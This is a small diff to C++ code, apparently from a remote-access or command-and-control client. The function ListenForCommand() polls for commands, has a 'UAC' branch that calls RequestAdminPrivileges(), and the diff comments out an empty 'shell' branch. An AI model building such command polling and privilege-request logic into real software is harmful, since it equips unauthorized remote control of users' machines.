@@ -71,9 +71,12 @@ void ListenForCommand() {
         else if (cmd == "UAC") {
             RequestAdminPrivileges();
         }
+
+        /*
         else if (parseCommand(cmd) == "shell") {
 
         }
+        */
 
         this_thread::sleep_for(chrono::seconds(5));
     }
